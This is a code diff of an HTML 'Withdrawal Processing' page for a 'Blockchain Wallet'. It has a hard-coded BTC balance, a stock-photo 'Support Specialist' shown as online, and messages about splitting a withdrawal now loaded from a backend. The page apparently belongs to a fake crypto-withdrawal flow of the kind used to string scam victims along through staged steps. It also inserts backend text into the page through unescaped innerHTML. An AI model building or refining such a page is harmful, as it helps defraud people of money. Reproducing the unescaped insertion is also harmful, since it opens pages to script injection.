@@ -4,59 +4,72 @@
 <head>
   <meta charset="UTF-8" />
   <title>Withdrawal Processing</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <script src="https://cdn.tailwindcss.com"></script>
 </head>
 
 <body class="bg-slate-100 dark:bg-slate-950 text-slate-800 dark:text-slate-200">
 
   <!-- Sticky Header -->
-  <header class="sticky top-0 z-50 flex justify-between items-center px-4 py-3 
+  <header class="sticky top-0 z-50 flex flex-wrap justify-between items-center gap-2 px-4 py-3
                bg-white dark:bg-slate-900 border-b border-slate-200 dark:border-slate-700">
     <h1 class="text-xl font-bold text-blue-500">Blockchain Wallet</h1>
-    <h2 class="text-xl font-bold text-blue-500">
+    <!-- <h2 class="text-lg sm:text-xl font-bold text-blue-500">
       Balance: <span id="balanceDisplay3">1.749542</span> BTC
-    </h2>
+    </h2> -->
   </header>
 
   <!-- Step 2 Card -->
   <main class="flex justify-center px-4 py-10">
-    <div class="w-full max-w-md bg-slate-800/90 rounded-2xl p-6 shadow-xl">
+    <div class="w-full max-w-md bg-slate-800/90 rounded-2xl p-5 sm:p-6 shadow-xl">
 
       <!-- Support Header -->
       <div class="flex items-center gap-3 mb-4">
-        <img src="https://i.pravatar.cc/80?img=32" class="w-12 h-12 rounded-full border border-slate-600" />
+        <img src="https://i.pravatar.cc/80?img=32" class="w-11 h-11 rounded-full border border-slate-600" />
         <div>
           <p class="font-semibold text-white">Support Specialist</p>
           <p class="text-sm text-green-400">Online</p>
         </div>
       </div>
 
-      <!-- Message -->
-      <div class="space-y-4 text-slate-200 text-sm leading-relaxed">
-        <p>
-          We’ve received your transfer request. Due to payout limits,
-          this withdrawal will be processed in <b>two equal parts</b>.
-        </p>
-
-        <p class="text-blue-400 font-semibold">
-          0.874771 BTC + 0.874771 BTC
-        </p>
-
-        <p>
-          Please confirm to proceed with the split transaction.
-        </p>
+      <!-- Dynamic Support Messages -->
+      <div id="supportMessages" class="space-y-4 text-slate-200 text-sm leading-relaxed">
+        <!-- Backend messages injected here -->
       </div>
 
       <!-- Action Button -->
       <button id="confirmBtn" class="mt-6 w-full py-3 rounded-xl font-semibold text-black
-                   bg-yellow-500 hover:bg-yellow-400 transition">
+               bg-yellow-500 hover:bg-yellow-400 active:bg-yellow-300 transition">
         REQUEST WITHDRAWAL
       </button>
 
     </div>
   </main>
 
-  <script src="/step2.js"></script>
+  <script>
+    // Load support messages from backend
+    async function loadSupportMessages() {
+      try {
+        const res = await fetch('/api/support');
+        const data = await res.json();
+
+        const box = document.getElementById('supportMessages');
+        box.innerHTML = data.map(msg => `
+          <p>${msg.text}</p>
+        `).join('');
+      } catch (e) {
+        console.error('Failed to load support messages');
+      }
+    }
+
+    // Button → next page
+    document.getElementById('confirmBtn').addEventListener('click', () => {
+      window.location.href = '/next.html';
+    });
+
+    loadSupportMessages();
+  </script>
+
 </body>
 
 </html>
